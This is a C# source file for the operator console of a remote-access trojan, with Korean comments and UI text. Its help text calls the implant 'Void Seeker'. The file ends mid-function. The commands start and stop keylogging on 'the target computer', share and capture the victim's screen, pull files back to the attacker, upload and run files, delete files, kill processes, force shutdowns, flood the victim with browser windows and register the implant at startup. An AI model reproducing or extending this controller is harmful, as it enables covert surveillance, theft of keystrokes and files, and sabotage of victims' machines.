using System.Windows;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Media;
using System.Media;

namespace AKIRA_F_Clt
{
    /// <summary>
    /// MainWindow.xaml에 대한 상호 작용 논리
    /// </summary>
    public partial class MainWindow : Window
    {
        public static string ip, FileName;
        //Set the IP address of the server, and its port.
        public IPEndPoint ipep1;
        public IPEndPoint ipep2;
        public static IPEndPoint ipEndPoint1 = new IPEndPoint(IPAddress.Any, 7777); //파일 다운로드 서버
        public static IPEndPoint ipEndPoint2 = new IPEndPoint(IPAddress.Any, 7778); //더미포트
        public static IPEndPoint[] ipEndPoint = new IPEndPoint[2] { ipEndPoint1, ipEndPoint2 };

        public Socket server1 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        public static byte[] data = new byte[1024];

        public static string WARN = "";

        public SoundPlayer md = new SoundPlayer(Properties.Resources.mic);
        public string warn
        {
            get { return WARN; }
            set { WARN = value; }
        }


        public MainWindow()
        {
            InitializeComponent();
            PORT_Text.IsEnabled = false;
            PORT_Text.Text = "AUTO MODE";
            BUT2.IsEnabled = false;

            md.PlayLooping();

        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {

        }

        private void Button_Click_1(object sender, RoutedEventArgs e)
        {
            if (BUT.IsEnabled == false)
            {
                if (CONSOLE.Text == "/help")
                {
                    help();
                }
                else if (CONSOLE.Text == "/업로드")
                {
                    richitextbox1.AppendText("보낼파일은 반드시 현재 프로그램의 경로안에 같이 있어야 합니다!!!" + Environment.NewLine);
                    //richitextbox1.AppendText("이름.확장명" + Environment.NewLine);
                    //CONSOLE.Text = "파일의 경로+이름+확장명을 입력해 주세요";

                    OpenFileDialog pFileDlg = new OpenFileDialog();
                    pFileDlg.Filter = "All Files(*.*)|*.*";
                    pFileDlg.Title = "보낼 파일의 경로를 선택해 주세요";

                    //pFileDlg.ShowDialog();

                    Nullable<bool> result = pFileDlg.ShowDialog();

                    if (result == true)
                    {
                        string GEFNE = pFileDlg.FileName.ToString();
                        //string GE = Path.GetExtension(GEFNE);
                        string FNE = GEFNE.Substring(GEFNE.LastIndexOf("\\") + 1);
                        FileName = FNE;
                    }

                    //if (pFileDlg.ShowDialog() == DialogResult.HasValue && DialogResult.Value)
                    //{
                    //    FileName = pFileDlg.FileName.ToString();
                    //}
                    richitextbox1.AppendText(Environment.NewLine + "파일이름 : " + FileName);
                    //FileName = Console.ReadLine();
                    //MessageBox.Show(FileName);
                    //CONSOLE.Text = FileName;//보낼 파일의 이름이된다.
                    //data = Encoding.Unicode.GetBytes("OK");
                    //server1.Send(data);
                    data = Encoding.Unicode.GetBytes("FTP$:" + FileName);
                    server1.Send(data);

                    byte[] ms = new byte[1024];
                    int b = server1.Receive(ms);
                    string Re = "Received data : " + Encoding.Unicode.GetString(ms, 0, b);
                    richitextbox1.AppendText(Re + Environment.NewLine);

                    if (Re == "파일이 이미 있거나 잘못 입력되었습니다.")
                    {

                    }
                    else
                    {
                        Thread.Sleep(1000);
                        FTPClient();

                        CONSOLE.Text = "";
                        richitextbox1.AppendText("전송완료" + Environment.NewLine);
                    }
                }
                else if (CONSOLE.Text == "/파일실행")
                {
                    InputST IPU = new InputST();
                    IPU.ShowDialog();

                    string a = InputST.Passvalue;

                    if (a == "CANC$")
                    {
                        richitextbox1.AppendText("취소됨" + Environment.NewLine);
                        return;
                    }

                    string f = a;
                    //Console.Write("실행할 파일의 경로와 확장자 명을 모두 입력하세요 : ");
                    //f = Console.ReadLine();

                    if (f == "" || f == null || f == string.Empty)
                    {
                        //Console.WriteLine("입력되지 않았습니다. 다시입력해 주세요");
                        richitextbox1.AppendText("입력되지 않았습니다. 다시입력해 주세요" + Environment.NewLine);
                    }
                    else
                    {
                        data = Encoding.Unicode.GetBytes("STF$:" + f);
                        server1.Send(data);

                        byte[] ms = new byte[1024];
                        int b = server1.Receive(ms);
                        Console.WriteLine("Received data : " + Encoding.Unicode.GetString(ms, 0, b));
                        Console.WriteLine();
                    }


                }
                else if (CONSOLE.Text == "/창테러")
                {
                    richitextbox1.AppendText("테러단위를 입력해 주세요" + Environment.NewLine);
                    InputST IPU = new InputST();
                    IPU.ShowDialog();

                    string a = InputST.Passvalue;

                    if (a == "CANC$")
                    {
                        richitextbox1.AppendText("취소됨" + Environment.NewLine);
                        return;
                    }

                    //Console.Write("테러단위? : ");

                    int TR = Convert.ToInt32(a);

                    if (TR <= 0)
                    {
                        //Console.WriteLine("정수가 입력되지 않았습니다. 다시입력해 주세요");
                        richitextbox1.AppendText("정수가 입력되지 않았습니다. 다시입력해 주세요" + Environment.NewLine);
                    }
                    else
                    {
                        richitextbox1.AppendText("테러할 사이트의 주소를 'http://' 를 제외하고 쓰십시오" + Environment.NewLine);
                        IPU.ShowDialog();

                        a = InputST.Passvalue;

                        if (a == "CANC$")
                        {
                            richitextbox1.AppendText("취소됨" + Environment.NewLine);
                            return;
                        }

                        //Console.Write("테러할 사이트의 주소를 'http://' 를 제외하고 쓰십시오 : ");
                        string w = a;

                        byte[] sendBuffer = Encoding.Unicode.GetBytes("WIN$:" + TR + ":" + w);
                        server1.Send(sendBuffer);
                    }
                }
                else if (CONSOLE.Text == "/셧다운")
                {
                    int time = 0;
                    //Console.Write("몇 초 후 종료시키겠습니까? : ");
                    richitextbox1.AppendText("몇 초 후 종료시킬지 입력해 주세요" + Environment.NewLine);

                    InputST IPU = new InputST();
                    IPU.ShowDialog();

                    string a = InputST.Passvalue;

                    if (a == "CANC$")
                    {
                        richitextbox1.AppendText("취소됨" + Environment.NewLine);
                        return;
                    }

                    time = Convert.ToInt32(a);

                    if (time <= 0)
                    {
                        //Console.WriteLine("정상적으로 입력되지 않았습니다. 다시입력해 주세요");
                        richitextbox1.AppendText("정상적으로 입력되지 않았습니다. 다시입력해 주세요" + Environment.NewLine);
                    }
                    else
                    {
                        data = Encoding.Unicode.GetBytes("STH$:" + time);
                        server1.Send(data);
                    }

                }
                else if (CONSOLE.Text == "/익스종료")
                {
                    //명령 전송
                    data = Encoding.Unicode.GetBytes("IEX$:" + CONSOLE.Text);
                    server1.Send(data);

                    //명령 수신
                    byte[] ms = new byte[1024];
                    int b = server1.Receive(ms);
                    string Re = "Received data : " + Encoding.Unicode.GetString(ms, 0, b);
                    //Console.WriteLine(Re);
                    richitextbox1.AppendText(Re + Environment.NewLine);
                }
                else if (CONSOLE.Text == "/프로세스목록보기")
                {
                    //명령 전송
                    data = Encoding.Unicode.GetBytes("POL$:" + CONSOLE.Text);
                    server1.Send(data);

                    //명령 수신
                    byte[] ms = new byte[10485760];
                    int b = server1.Receive(ms);
                    string Re = "Received data : " + Encoding.Unicode.GetString(ms, 0, b);
                    //Console.WriteLine(Re);
                    richitextbox1.AppendText(Re + Environment.NewLine);
                }
                else if (CONSOLE.Text == "/프로세스종료")
                {
                    //Console.Write("종료할 프로세스 이름을 입력하세요 : ");
                    richitextbox1.AppendText("종료할 프로세스 이름을 입력하세요" + Environment.NewLine);

                    InputST IPU = new InputST();
                    IPU.ShowDialog();

                    string a = InputST.Passvalue;

                    if (a == "CANC$")
                    {
                        richitextbox1.AppendText("취소됨" + Environment.NewLine);
                        return;
                    }

                    //CONSOLE.Text = Console.ReadLine();

                    //명령 전송
                    data = Encoding.Unicode.GetBytes("POK$:" + a);
                    server1.Send(data);

                    //명령 수신
                    byte[] ms = new byte[10485760];
                    int b = server1.Receive(ms);
                    string Re = "Received data : " + Encoding.Unicode.GetString(ms, 0, b);
                    //Console.WriteLine(Re);
                    richitextbox1.AppendText(Re + Environment.NewLine);
                }
                else if (CONSOLE.Text == "/키로그시작")
                {
                    //명령 전송
                    data = Encoding.Unicode.GetBytes("KLO$:" + CONSOLE.Text);
                    server1.Send(data);

                    //명령 수신
                    byte[] ms = new byte[1024];
                    int b = server1.Receive(ms);
                    string Re = "Received data : " + Encoding.Unicode.GetString(ms, 0, b);
                    //Console.WriteLine(Re);
                    richitextbox1.AppendText(Re + Environment.NewLine);
                }
                else if (CONSOLE.Text == "/키로그중지")
                {
                    //명령 전송
                    data = Encoding.Unicode.GetBytes("KLN$:" + CONSOLE.Text);
                    server1.Send(data);

                    //명령 수신
                    byte[] ms = new byte[1024];
                    int b = server1.Receive(ms);
                    string Re = "Received data : " + Encoding.Unicode.GetString(ms, 0, b);
                    //Console.WriteLine(Re);
                    richitextbox1.AppendText(Re + Environment.NewLine);
                }
                else if (CONSOLE.Text == "/웹서버실행")
                {
                    //명령 전송
                    data = Encoding.Unicode.GetBytes("WEB$:" + CONSOLE.Text);
                    server1.Send(data);

                    //명령 수신
                    byte[] ms = new byte[1024];
                    int b = server1.Receive(ms);
                    string Re = "Received data : " + Encoding.Unicode.GetString(ms, 0, b);
                    //Console.WriteLine(Re);
                    richitextbox1.AppendText(Re + Environment.NewLine);
                }
                else if (CONSOLE.Text == "/화면공유시작")
                {
                    //명령 전송
                    data = Encoding.Unicode.GetBytes("RMT$:" + CONSOLE.Text);
                    server1.Send(data);

                    //명령 수신
                    byte[] ms = new byte[1024];
                    int b = server1.Receive(ms);
                    string Re = "Received data : " + Encoding.Unicode.GetString(ms, 0, b);
                    //Console.WriteLine(Re);
                    richitextbox1.AppendText(Re + Environment.NewLine);
                }
                else if (CONSOLE.Text == "/화면공유중지")
                {
                    //명령 전송
                    data = Encoding.Unicode.GetBytes("RMN$:" + CONSOLE.Text);
                    server1.Send(data);

                    //명령 수신
                    byte[] ms = new byte[1024];
                    int b = server1.Receive(ms);
                    string Re = "Received data : " + Encoding.Unicode.GetString(ms, 0, b);
                    //Console.WriteLine(Re);
                    richitextbox1.AppendText(Re + Environment.NewLine);
                }
                else if (CONSOLE.Text == "/파일삭제")
                {
                    richitextbox1.AppendText("삭제할 파일의 경로를 입력해 주세요" + Environment.NewLine);
                    //Console.Write("삭제할 파일의 경로를 입력해 주세요 : ");
                    InputST IPU = new InputST();
                    IPU.ShowDialog();

                    string a = InputST.Passvalue;

                    if (a == "CANC$")
                    {
                        richitextbox1.AppendText("취소됨" + Environment.NewLine);
                        return;
                    }


                    //CONSOLE.Text = Console.ReadLine();

                    //명령 전송
                    data = Encoding.Unicode.GetBytes("DEF$:" + a);
                    server1.Send(data);

                    //명령 수신
                    byte[] ms = new byte[1024];
                    int b = server1.Receive(ms);
                    string Re = "Received data : " + Encoding.Unicode.GetString(ms, 0, b);
                    //Console.WriteLine(Re);
                    richitextbox1.AppendText(Re + Environment.NewLine);
                }
                else if (CONSOLE.Text == "/메세지")
                {
                    //Console.WriteLine("보낼메세지를 쓰세요");
                    //Console.Write("메세지 : ");

                    richitextbox1.AppendText("보낼 메세지를 입력해 주세요" + Environment.NewLine);
                    string ms = "";

                    InputST IPU = new InputST();
                    IPU.ShowDialog();

                    string a = InputST.Passvalue;

                    if (a == "CANC$")
                    {
                        richitextbox1.AppendText("취소됨" + Environment.NewLine);
                        return;
                    }

                    ms = a;

                    data = Encoding.Unicode.GetBytes("MSG$:" + a);
                    server1.Send(data);
                    //CONSOLE.Text = "";

                }
                else if (CONSOLE.Text == "/캡쳐")
                {
                    data = Encoding.Unicode.GetBytes("CAP$:" + "/캡쳐");
                    server1.Send(data);
                    CONSOLE.Text = "";

                    //명령 수신
                    byte[] ms = new byte[1024];
                    int b = server1.Receive(ms);
                    string Re = "Received data : " + Encoding.Unicode.GetString(ms, 0, b);
                    //Console.WriteLine(Re);
                    richitextbox1.AppendText(Re + Environment.NewLine);

                }
                else if (CONSOLE.Text == "/다운로드")
                {
                    string welcome = "DOWN$";

                    //Console.WriteLine("목록 : 캡쳐");
                    richitextbox1.AppendText("빠른명령어 : 캡쳐" + Environment.NewLine);

                    //Console.WriteLine(" ");
                    //Console.WriteLine("목록에 있는것 또는 경로를 입력하세요 드라이브문자열 뒤 ':' 는 '*' 로 대체됩니다. ");
                    richitextbox1.AppendText("목록에 있는것 또는 경로를 입력하세요 드라이브문자열 뒤 ':' 는 '*' 로 대체됩니다. " + Environment.NewLine);

                    //Console.WriteLine(" ");
                    //Console.Write("다운로드 할 것은 무엇인가요? : ");
                    richitextbox1.AppendText("다운로드 할 것의 '빠른명령어' 또는 경로를 입력해주세요 ex) C:\\01.jpg" + Environment.NewLine);

                    InputST IPU = new InputST();
                    IPU.ShowDialog();

                    string a = InputST.Passvalue;

                    if (a == "CANC$")
                    {
                        richitextbox1.AppendText("취소됨" + Environment.NewLine);
                        return;
                    }

                    string UP = a;

                    //Console.WriteLine(" ");
                    //Console.Write("다운받을 컴퓨터의 IP는 무엇인가요? : ");
                    richitextbox1.AppendText("다운을 받는 컴퓨터의 IP를 입력해주세요" + Environment.NewLine);

                    IPU.ShowDialog();

                    a = InputST.Passvalue;

                    if (a == "CANC$")
                    {
                        richitextbox1.AppendText("취소됨" + Environment.NewLine);
                        return;
                    }

                    string Yip = a;

                    ListenPorts listenport = new ListenPorts(ipEndPoint);
                    listenport.FTPListen(); //다운로드서버

                    richitextbox1.AppendText(WARN + Environment.NewLine);

                    data = Encoding.Unicode.GetBytes(welcome + ":" + Yip + ":" + UP);
                    server1.Send(data);

                }

                else if (CONSOLE.Text == "")
                {
                    //Console.WriteLine("명령입력이 되지 않았습니다.");
                    richitextbox1.AppendText("명령입력이 되지 않았습니다.");
                }
                else if (CONSOLE.Text == "/전체경로탐색")
                {

                    //Console.Write("탐색할 경로를 입력해 주세요 단 ':' 표시는 *으로 대체한다. : ");
                    richitextbox1.AppendText("탐색할 경로를 입력해 주세요 단 ':' 표시는 *으로 대체한다." + Environment.NewLine);
                    //CONSOLE.Text = Console.ReadLine();

                    InputST IPU = new InputST();
                    IPU.ShowDialog();

                    string a = InputST.Passvalue;

                    if (a == "CANC$")
                    {
                        richitextbox1.AppendText("취소됨" + Environment.NewLine);
                        return;
                    }

                    data = Encoding.Unicode.GetBytes("DIR$:" + a);
                    server1.Send(data);

                    // 메시지 받음
                    byte[] msg = new byte[1024];
                    int bytes = server1.Receive(msg);
                    //Console.WriteLine("Received data : " + Encoding.Unicode.GetString(msg, 0, bytes));
                    richitextbox1.AppendText("Received data : " + Encoding.Unicode.GetString(msg, 0, bytes) + Environment.NewLine);
                    //Console.WriteLine();

                    string CONECT = "";

                    data = Encoding.Unicode.GetBytes(".");
                    server1.Send(data);

                    byte[] MD = new byte[10485760];
                    bytes = server1.Receive(MD);
                    CONECT = Encoding.Unicode.GetString(MD, 0, bytes);
                    //Console.WriteLine(CONECT);
                    richitextbox1.AppendText(CONECT + Environment.NewLine);


                }
                else if (CONSOLE.Text == "/폴더경로탐색")
                {
                    //Console.Write("탐색할 경로를 입력해 주세요 단 ':' 표시는 *으로 대체한다. : ");
                    richitextbox1.AppendText("탐색할 경로를 입력해 주세요 단':' 표시는 *으로 대체한다." + Environment.NewLine);
                    //CONSOLE.Text = Console.ReadLine();

                    InputST IPU = new InputST();
                    IPU.ShowDialog();

                    string a = InputST.Passvalue;

                    if (a == "CANC$")
                    {
                        richitextbox1.AppendText("취소됨" + Environment.NewLine);
                        return;
                    }

                    data = Encoding.Unicode.GetBytes("DIRO$:" + a);
                    server1.Send(data);


                    //확인메세지
                    byte[] msg1 = new byte[1024];
                    int bytes1 = server1.Receive(msg1);
                    //Console.WriteLine("Received data : " + Encoding.Unicode.GetString(msg1, 0, bytes1));
                    richitextbox1.AppendText("Received data : " + Encoding.Unicode.GetString(msg1, 0, bytes1) + Environment.NewLine);
                    //Console.WriteLine();


                    //탐색된 메세지
                    byte[] msg2 = new byte[1048576];
                    int bytes2 = server1.Receive(msg2);
                    string DD = "";
                    DD = Encoding.Unicode.GetString(msg2, 0, bytes2);
                    //Console.WriteLine(DD);
                    richitextbox1.AppendText(DD + Environment.NewLine);
                }
                else if (CONSOLE.Text == "/시작프로그램등록")
                {
                    data = Encoding.Unicode.GetBytes("STT$:");
                    server1.Send(data);

                    //데이터 수신
                    byte[] msg1 = new byte[1024];
                    int bytes1 = server1.Receive(msg1);
                    //Console.WriteLine("Received data : " + Encoding.Unicode.GetString(msg1, 0, bytes1));
                    richitextbox1.AppendText("Received data : " + Encoding.Unicode.GetString(msg1, 0, bytes1) + Environment.NewLine);
                    //Console.WriteLine();
                }
                else if (CONSOLE.Text == "/시작프로그램등록해제")
                {
                    data = Encoding.Unicode.GetBytes("STD$:");
                    server1.Send(data);

                    //데이터 수신
                    byte[] msg1 = new byte[1024];
                    int bytes1 = server1.Receive(msg1);
                    //Console.WriteLine("Received data : " + Encoding.Unicode.GetString(msg1, 0, bytes1));
                    richitextbox1.AppendText("Received data : " + Encoding.Unicode.GetString(msg1, 0, bytes1) + Environment.NewLine);
                    //Console.WriteLine();
                }

                else if (CONSOLE.Text == "/파일경로탐색")
                {
                    //Console.Write("탐색할 경로를 입력해 주세요 단 ':' 표시는 *으로 대체한다. : ");
                    richitextbox1.AppendText("탐색할 경로를 입력해 주세요 단 ':' 표시는 *으로 대체한다." + Environment.NewLine);

                    //CONSOLE.Text = Console.ReadLine();

                    InputST IPU = new InputST();
                    IPU.ShowDialog();

                    string a = InputST.Passvalue;

                    if (a == "CANC$")
                    {
                        richitextbox1.AppendText("취소됨" + Environment.NewLine);
                        return;
                    }

                    data = Encoding.Unicode.GetBytes("DIRF$:" + a);
                    server1.Send(data);

                    //확인메세지
                    byte[] msg1 = new byte[1024];
                    int bytes1 = server1.Receive(msg1);
                    //Console.WriteLine("Received data : " + Encoding.Unicode.GetString(msg1, 0, bytes1));
                    richitextbox1.AppendText("Received data : " + Encoding.Unicode.GetString(msg1, 0, bytes1) + Environment.NewLine);
                    //Console.WriteLine();


                    //탐색된 메세지
                    byte[] msg2 = new byte[1048576];
                    int bytes2 = server1.Receive(msg2);
                    string DD = "";
                    DD = Encoding.Unicode.GetString(msg2, 0, bytes2);
                    //Console.WriteLine(DD);
                    richitextbox1.AppendText(DD + Environment.NewLine);
                }
                else if (CONSOLE.Text == "/프로그램종료")
                {
                    data = Encoding.Unicode.GetBytes("KILL$:");
                    server1.Send(data);

                    byte[] msg1 = new byte[1024];
                    int bytes1 = server1.Receive(msg1);
                    //Console.WriteLine("Received data : " + Encoding.Unicode.GetString(msg1, 0, bytes1));
                    richitextbox1.AppendText("Received data : " + Encoding.Unicode.GetString(msg1, 0, bytes1) + Environment.NewLine);
                    //Console.WriteLine();
                }

                else if (CONSOLE.Text == "/서버열기")
                {
                    ListenPorts listenport = new ListenPorts(ipEndPoint);
                    listenport.FTPListen(); //다운로드서버

                    richitextbox1.AppendText(WARN + Environment.NewLine);

                    richitextbox1.AppendText("경고!!" + Environment.NewLine + "아직 시험개발중인 기능입니다!!!!!!!" + Environment.NewLine);
                }

                else
                {
                    data = Encoding.Unicode.GetBytes(CONSOLE.Text);
                    server1.Send(data);

                    richitextbox1.AppendText("Send by the port : " + server1.LocalEndPoint.ToString() + Environment.NewLine);
                    richitextbox1.AppendText("Send data : " + CONSOLE.Text + Environment.NewLine);

                    byte[] msg = new byte[1024];
                    int bytes = server1.Receive(msg);

                    richitextbox1.AppendText("Received data : " + Encoding.Unicode.GetString(msg, 0, bytes) + Environment.NewLine);


                    //Console.WriteLine("Send by the port : {0}", server1.LocalEndPoint.ToString());
                    //Console.WriteLine("Send data : {0}", CONSOLE.Text);
                    // 메시지 받음
                    //Console.WriteLine("Received data : {0}", Encoding.Unicode.GetString(msg, 0, bytes));
                    //Console.WriteLine();
                    // 소켓 닫기
                    //server1.Close();
                }

                CONSOLE.Text = "";
            }
            else
            {
                MessageBox.Show("서버에 먼저 연결해 주세요");
                CONSOLE.Text = "";
            }
        }

        private void Button_Click_2(object sender, RoutedEventArgs e)
        {
            //소켓닫기
            server1.Close();
            BUT.IsEnabled = true;
            BUT2.IsEnabled = false;
            Process.Start(Application.ResourceAssembly.Location);
            Application.Current.Shutdown();
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {

            ip = IP_Text.Text;

            Dictionary<String, String> netConInfo = new Dictionary<string, string>();
            netConInfo.Add("ip", ip);

            IPAddress dnsServerIP = Dns.GetHostAddresses(netConInfo["ip"])[0];

            ipep1 = new IPEndPoint(dnsServerIP, 7779); //메인 콘솔서버
            ipep2 = new IPEndPoint(dnsServerIP, 7780); //파일 업로드 서버

            //Console.WriteLine("This is a Client, host name is {0}", Dns.GetHostName());
            richitextbox1.AppendText("This is a Client host name is" + Dns.GetHostName() + Environment.NewLine);
            //Console.WriteLine();


            string welcome = "Hello, Multiple server ! "; //Send 되는 문자열

            try
            {
                // 소켓 생성은 전역으로됨 


                //서버 연결
                server1.Connect(ipep1);
                //Console.WriteLine(Environment.NewLine + "접속시도...");
                richitextbox1.AppendText(Environment.NewLine + "Connecting Server...");
                //Console.ForegroundColor = ConsoleColor.Green;
                //Console.WriteLine(Environment.NewLine + "/help 를 입력하여 명령어 목록을 볼 수 있습니다!!");
                richitextbox1.AppendText(Environment.NewLine + "help 를 입력하여 명령어 목록을 볼 수 있습니다!");
                //Console.ForegroundColor = ConsoleColor.White;

                data = Encoding.Unicode.GetBytes("CONNECT$:" + welcome);
                server1.Send(data);

                byte[] m = new byte[1024];
                int bt = server1.Receive(m);
                //Console.WriteLine("Received data : " + Encoding.Unicode.GetString(m, 0, bt));
                richitextbox1.AppendText("Received data : " + Encoding.Unicode.GetString(m, 0, bt) + Environment.NewLine);
                //Console.WriteLine();


                //welcome = Console.ReadLine();
                richitextbox1.AppendText(welcome + Environment.NewLine);

                BUT.IsEnabled = false;
                BUT2.IsEnabled = true;
            }
            catch (Exception ex)
            {
                richitextbox1.AppendText(ex.Message.ToString());

                BUT.IsEnabled = true;
                BUT2.IsEnabled = false;
            }
        }

        void FTPClient()
        {
            try
            {
                //Socket mySocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                //mySocket.Connect(IPAddress.Parse(ip), 8888);
                Socket server2 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                server2.Connect(ipep2);

                FileStream fileStr = new FileStream(FileName, FileMode.Open, FileAccess.Read);
                int fileLength = (int)fileStr.Length;
                byte[] buffer = BitConverter.GetBytes(fileLength);
                server2.Send(buffer);
                int count = fileLength / 1024 + 1;

                BinaryReader reader = new BinaryReader(fileStr);

                for (int i = 0; i < count; i++)
                {
                    buffer = reader.ReadBytes(1024);
                    server2.Send(buffer);
                }
                reader.Close();
                server2.Close();
            }
            catch
            {
                //Console.WriteLine("전송완료");
                richitextbox1.AppendText("전송완료" + Environment.NewLine);
            }
        }

        private void Button_Click_3(object sender, RoutedEventArgs e)
        {
            md.Stop();
            md.PlayLooping();
        }

        private void Button_Click_4(object sender, RoutedEventArgs e)
        {
            md.Stop();
        }

        private void CONSOLE_KeyDown(object sender, System.Windows.Input.KeyEventArgs e)
        {
            if (BUT.IsEnabled == false)
            {
                if (e.Key == System.Windows.Input.Key.Return)
                {
                    Button_Click_1(sender, e);
                    CONSOLE.ScrollToEnd();
                }
            }
            else
            {
                MessageBox.Show("먼저 서버에 연결해 주세요");
                CONSOLE.Text = "";
            }
        }

        private void IP_Text_KeyDown(object sender, System.Windows.Input.KeyEventArgs e)
        {
            if (e.Key == System.Windows.Input.Key.Return)
            {
               Button_Click(sender, e);
            }
        }

        private void HKey_Click(object sender, RoutedEventArgs e)
        {

            Remote ROE = new Remote();
            ROE.ShowDialog();

            string a = Remote.Passvalue2;


            if(a == "/help")
            {
                help();
                return;
            }

            data = Encoding.Unicode.GetBytes(a);
            server1.Send(data);

            //richitextbox1.AppendText("Send by the port : " + server1.LocalEndPoint.ToString() + Environment.NewLine);
            richitextbox1.AppendText("Send data : " + a + Environment.NewLine);

            byte[] msg = new byte[1024];
            int bytes = server1.Receive(msg);

            richitextbox1.AppendText("Received data : " + Encoding.Unicode.GetString(msg, 0, bytes) + Environment.NewLine);


        }

        void help()
        {
            richitextbox1.AppendText("/다운로드 : Void Seeker 가 관리하는 파일을 zip파일로 다운로드 받습니다" + Environment.NewLine + "목록 : 사진, Attacker\n" + Environment.NewLine);
            richitextbox1.AppendText("/업로드 : 파일을 전송하고 C:\\factory\\ 에 저장합니다." + Environment.NewLine);
            richitextbox1.AppendText("/창테러 : n개의 인터넷창을 테러합니다.\n/익스종료 : 모든 익스플로러 프로세스를 종료합니다." + Environment.NewLine);
            richitextbox1.AppendText("/셧다운 : 컴퓨터를 종료시켜버립니다." + Environment.NewLine);
            richitextbox1.AppendText("/캡쳐 : 바탕화면을 캡쳐하여 C:\\work\\ 에 저장합니다." + Environment.NewLine);
            richitextbox1.AppendText("/전체경로탐색 : 지정된 경로의 파일과 폴더 목록을 전부 보여줍니다." + Environment.NewLine);
            richitextbox1.AppendText("/폴더경로탐색 : 지정된 경로안의 폴더목록을 전부 보여줍니다." + Environment.NewLine);
            richitextbox1.AppendText("/파일경로탐색 : 지정된 경로안의 폴더목록을 전부 보여줍니다." + Environment.NewLine);
            richitextbox1.AppendText("/파일삭제 : 서버의 지정된 경로의 파일을 삭제합니다." + Environment.NewLine);
            richitextbox1.AppendText("/파일실행 : 서버의 지정된 경로의 파일을 실행합니다." + Environment.NewLine);
            richitextbox1.AppendText("/시작프로그램등록 : 시작프로그램으로 등록합니다." + Environment.NewLine);
            richitextbox1.AppendText("/시작프로그램등록해제 : 시작프로그램 등록을 해제합니다." + Environment.NewLine);
            richitextbox1.AppendText("/프로그램종료 : 서버 프로그램을 종료 합니다." + Environment.NewLine);
            richitextbox1.AppendText("/메세지 : 서버가 작동중인 컴퓨터에 메세지를 띄웁니다." + Environment.NewLine);
            richitextbox1.AppendText("/키로그시작 : 키보드 키의 로그를 타겟 컴퓨터의 C:\\factory\\key\\ 에 사진과 로그로 남깁니다." + Environment.NewLine);
            richitextbox1.AppendText("/키로그중지 : 키로그를 중지합니다." + Environment.NewLine);
            richitextbox1.AppendText("/화면공유시작 : 타겟의 화면을 웹으로 공유합니다." + Environment.NewLine);
            richitextbox1.AppendText("/화면공유중지 : 화면공유를 중지합니다." + Environment.NewLine);
            richitextbox1.AppendText("/웹서버시작(미구현 개발) : 타겟의 컴퓨터에서 ASP.NET 형태의 웹서버를 만듭니다." + Environment.NewLine);
            richitextbox1.AppendText("/프로세스목록보기 : 상대방컴퓨터의 프로세스 목록을 가져옵니다." + Environment.NewLine);
        }
    }

    class ListenPorts
    {
        Socket[] socket;
        IPEndPoint[] ipEndPoint;
        public static string FTPFileN;

        internal ListenPorts(IPEndPoint[] ipEndPoint)
        {
            this.ipEndPoint = ipEndPoint;
            socket = new Socket[ipEndPoint.Length];
        }

        public void FTPListen()
        {
            //for (int i = 0; i < ipEndPoint.Length; i++)
            //{
            socket[0] = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket[0].Bind(ipEndPoint[0]);

            Thread t_handler = new Thread(FTPServer);
            t_handler.IsBackground = true;
            t_handler.Start(socket[0]);
            //}
            //Console.WriteLine("FTP서버 열기성공");

            MainWindow ric = new MainWindow();
            ric.warn = "FTP서버 열기 성공" + Environment.NewLine;

        }

        public void FTPServer(object sender)
        {
            FTPFileN = "DOWN.zip";

            if (File.Exists("DOWN.zip"))
            {
                File.Delete("DOWN.zip");
            }

            Socket m_client = sender as Socket;
            m_client.Listen(100);
            Socket newSocket = m_client.Accept();

            ConsoleManager.Show();
            ConsoleManager.Show();
            Console.WriteLine("연결대기 성공");
            

            byte[] buffer = new byte[4];
            newSocket.Receive(buffer);
            int fileLength = BitConverter.ToInt32(buffer, 0);
            buffer = new byte[1024];
            int totalLength = 0;
            Console.WriteLine("성공");

            Console.WriteLine(FTPFileN);

            FileStream fileStr = new FileStream(FTPFileN, FileMode.Create, FileAccess.Write);
            BinaryWriter writer = new BinaryWriter(fileStr);
            Console.WriteLine("마지막단계 성공");
            while (totalLength < fileLength)
            {

                int receiveLength = newSocket.Receive(buffer);
                writer.Write(buffer, 0, receiveLength);
                totalLength += receiveLength;

            }
            Console.WriteLine("전송받음");
            writer.Close();
            newSocket.Close();
            m_client.Close();
            Thread.Sleep(3000);
            ConsoleManager.Hide();
            return;
        }
    }

    public static class ConsoleManager
    {
        private const string Kernel32_DllName = "kernel32.dll";

        [DllImport(Kernel32_DllName)]
        private static extern bool AllocConsole();

        [DllImport(Kernel32_DllName)]
        private static extern bool FreeConsole();

        [DllImport(Kernel32_DllName)]
        private static extern IntPtr GetConsoleWindow();

        [DllImport(Kernel32_DllName)]
        private static extern int GetConsoleOutputCP();

        public static bool HasConsole
        {
            get { return GetConsoleWindow() != IntPtr.Zero; }
        }

        /// <summary>
        /// Creates a new console instance if the process is not attached to a console already.
        /// </summary>
        public static void Show()
        {
            //#if DEBUG
            if (!HasConsole)
            {
                AllocConsole();
                InvalidateOutAndError();
            }
            //#endif
        }

        /// <summary>
        /// If the process has a console attached to it, it will be detached and no longer visible. Writing to the System.Console is still possible, but no output will be shown.
        /// </summary>
        public static void Hide()
        {
            //#if DEBUG
            if (HasConsole)
            {
                SetOutAndErrorNull();
                FreeConsole();
            }
            //#endif
        }

        public static void Toggle()
        {
            if (HasConsole)
            {
                Hide();
            }
            else
            {
                Show();
            }
        }

        static void InvalidateOutAndError()
        {
            Type type = typeof(System.Console);

            System.Reflection.FieldInfo _out = type.GetField("_out",
            System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.NonPublic);

            System.Reflection.FieldInfo _error = type.GetField("_error",
            System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.NonPublic);

            System.Reflection.MethodInfo _InitializeStdOutError = type.GetMethod("InitializeStdOutError",
            System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.NonPublic);

            Debug.Assert(_out != null);
            Debug.Assert(_error != null);

            Debug.Assert(_InitializeStdOutError != null);

